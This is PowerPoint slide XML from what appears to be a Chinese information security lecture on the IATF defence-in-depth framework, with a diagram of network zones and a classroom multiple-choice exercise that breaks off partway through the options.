                    <a:pt x="244" y="157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245" y="156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="246" y="156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="247" y="156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="248" y="155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="249" y="155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="250" y="154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="252" y="154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="253" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="256" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="260" y="149"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="260" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="261" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="262" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="263" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="264" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="265" y="145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="266" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="266" y="143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="267" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="268" y="141"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="269" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="270" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="270" y="139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="271" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="272" y="137"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="272" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273" y="135"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="274" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="274" y="133"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275" y="131"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277" y="127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277" y="126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278" y="125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279" y="123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="114"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="112"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="104"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="98"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="97"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="96"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="92"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="91"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="90"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="88"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="87"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="86"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="85"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="84"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="83"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="81"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="79"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279" y="77"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278" y="75"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277" y="71"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276" y="69"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="274" y="67"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="274" y="66"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273" y="65"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="272" y="64"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="272" y="63"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="271" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="270" y="61"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="269" y="60"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="268" y="59"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="268" y="58"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="267" y="58"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="266" y="57"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="265" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="264" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="263" y="54"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="262" y="53"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="261" y="52"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="260" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="50"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="256" y="48"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255" y="48"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="253" y="46"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="252" y="46"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="251" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="250" y="44"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="249" y="44"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="248" y="43"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="247" y="42"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="246" y="42"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="243" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="242" y="40"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="241" y="40"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="240" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238" y="38"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="236" y="38"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="235" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="234" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="233" y="36"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232" y="36"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="230" y="36"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="229" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="227" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="225" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="224" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="223" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="222" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="219" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="218" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="217" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="216" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="214" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="213" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="212" y="33"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="3333FF"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98378" name="Text Box 206"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1797" y="1730"/>
              <a:ext cx="34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lnSpc>
                  <a:spcPct val="75000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="FFFFFF"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>电信</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="75000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="FFFFFF"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>运营商</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98379" name="Text Box 207"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="521" y="119"/>
              <a:ext cx="90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lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" u="sng"/>
                <a:t>本地计算环境</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98380" name="AutoShape 208"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3096" y="2411"/>
              <a:ext cx="82" cy="73"/>
            </a:xfrm>
            <a:prstGeom prst="plus">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98381" name="Text Box 209"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3923" y="164"/>
              <a:ext cx="907"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lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" u="sng"/>
                <a:t>网络基础设施</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98382" name="Text Box 210"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2109" y="3793"/>
              <a:ext cx="2904"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lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" u="sng"/>
                <a:t>支撑性基础设施</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" u="sng"/>
                <a:t>（</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1" u="sng"/>
                <a:t>PKI</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" u="sng"/>
                <a:t>公钥基础设施、检测和响应基础设施）</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98383" name="Text Box 211"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="658" y="527"/>
              <a:ext cx="928" cy="1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b="1"/>
                <a:t>带密级网络的边界</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98384" name="Text Box 212"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="658" y="1318"/>
              <a:ext cx="812" cy="1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b="1"/>
                <a:t>专用网络的边界</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98385" name="Text Box 213"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="612" y="2114"/>
              <a:ext cx="812" cy="1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b="1"/>
                <a:t>公共网络的边界</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98308" name="标题 213"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822082" y="679254"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>总体框架</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1832728701"/>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2082" y="4695969"/>
            <a:ext cx="7422326" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">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D</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>强调的是以安全检测、漏洞监测和自适应填充“安全间隙”为循环来提高网络安全</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="标题 213"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822082" y="679254"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>课堂练习</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="617582" y="1484784"/>
            <a:ext cx="7985035" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>关于信息保障技术框架（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>），下列哪种说法是错误的？</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822082" y="2264616"/>
            <a:ext cx="7780534" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>强调深度防御，关注本地计算环境、区域边界、网络和基础设施、支撑性基础设施等多个领域的安全保障</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822082" y="3127352"/>
            <a:ext cx="7994900" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>B</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IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>强调深度防御，即对信息系统采用多层防护，实现组织的业务安全运作</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822082" y="4028055"/>
            <a:ext cx="7926382" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
